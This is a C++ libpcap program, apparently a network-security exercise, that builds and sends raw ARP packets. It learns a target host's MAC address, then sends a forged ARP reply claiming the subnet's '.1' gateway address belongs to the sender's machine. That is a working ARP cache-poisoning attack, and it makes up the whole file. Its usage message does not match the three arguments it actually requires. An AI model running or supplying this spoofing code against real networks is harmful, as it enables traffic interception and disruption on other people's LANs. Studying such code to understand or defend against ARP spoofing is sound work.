#include <cstdio>
#include <pcap.h>
#include <libnet.h>
#include <cstring>
#include <cstdlib>

#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>

#pragma pack(push, 1)
struct eth_hdr {
    uint8_t eth_dhost[ETHER_ADDR_LEN];
    uint8_t eth_shost[ETHER_ADDR_LEN];
    uint16_t eth_type;
};

struct arp_hdr {
    uint16_t ar_hrd;
    uint16_t ar_pro;
    uint8_t ar_hln;
    uint8_t ar_pln;
    uint16_t ar_op;
    uint8_t ar_smac[6];
    uint32_t ar_sip;
    uint8_t ar_tmac[6];
    uint32_t ar_tip;
};

struct EthArpPacket {
    eth_hdr eth_;
    arp_hdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface>\n");
    printf("sample: send-arp-test wlan0\n");
}

void getmac(char * interface, unsigned char * mac) {
    int sock = socket(PF_INET, SOCK_DGRAM, 0);
    struct ifreq req;
    int i = 0;

    if (sock < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&req, 0, sizeof(req));
    strncpy(req.ifr_name, interface, IF_NAMESIZE - 1);

    if (ioctl(sock, SIOCGIFHWADDR, &req) < 0) {
        perror("ioctl");
        exit(EXIT_FAILURE);
    }
    memcpy(mac, (unsigned char *)req.ifr_hwaddr.sa_data, 6);
    close(sock);
}

void make_arp_packet(EthArpPacket* buf, uint8_t smac[], uint32_t sip, uint8_t tmac[], uint32_t tip, int op){
    EthArpPacket packet;
    memcpy(packet.eth_.eth_dhost, tmac, 6);
    memcpy(packet.eth_.eth_shost, smac, 6);
    packet.eth_.eth_type = htons(ETHERTYPE_ARP);

    packet.arp_.ar_hrd = htons(ARPHRD_ETHER);
    packet.arp_.ar_pro = htons(ETHERTYPE_IP);
    packet.arp_.ar_hln = 6;
    packet.arp_.ar_pln = 4;
    packet.arp_.ar_op = htons(op);
    memcpy(packet.arp_.ar_smac, smac, 6);
    packet.arp_.ar_sip = htonl(sip);
    if(op == ARPOP_REQUEST) memset(tmac, 0, 6);
    memcpy(packet.arp_.ar_tmac, tmac, 6);
    packet.arp_.ar_tip = htonl(tip);

    memcpy(buf, &packet, sizeof(EthArpPacket));
}

void send_arp(pcap_t * handle, EthArpPacket * packet){
    int res = pcap_sendpacket(handle, reinterpret_cast<const uint8_t *>(packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

void my_pton(char * ip, uint32_t *buf){
    char * ptr = strtok(ip, ".");
    uint8_t temp[4];
    int i = 3;
    while(ptr != nullptr){
        temp[i--] = (uint8_t)atoi(ptr);
        ptr = strtok(nullptr, ".");
    }

    memcpy(buf, temp, 4);
}

int main(int argc, char* argv[]){
    if(argc != 4){
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if(handle == nullptr){
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    unsigned char smac[6] = {0,};
    getmac(argv[1], smac);

    unsigned char tmac[6] = {0, };
    memset(tmac, 0xFF, 6);

    uint32_t sip;
    uint32_t tip;
    my_pton(argv[2], &sip);
    my_pton(argv[3], &tip);

    EthArpPacket arp_packet;

    make_arp_packet(&arp_packet, smac, sip, tmac, tip, ARPOP_REQUEST);
    send_arp(handle, &arp_packet);

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if(res == 0) continue;
        if(res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        EthArpPacket * arp_reply_packet = (EthArpPacket *)packet;
        if(ntohs(arp_reply_packet->eth_.eth_type) == ETHERTYPE_ARP) {
            memcpy(&arp_packet, arp_reply_packet, sizeof(EthArpPacket));
            break;
        }
    }
    arp_packet.arp_.ar_tip = ((ntohl(arp_packet.arp_.ar_tip) >> 8) << 8) + 1;
    arp_packet.arp_.ar_sip = ntohl(arp_packet.arp_.ar_sip);

    make_arp_packet(&arp_packet, arp_packet.arp_.ar_tmac, arp_packet.arp_.ar_tip, arp_packet.arp_.ar_smac, arp_packet.arp_.ar_sip, ARPOP_REPLY);
    send_arp(handle, &arp_packet);

    pcap_close(handle);
}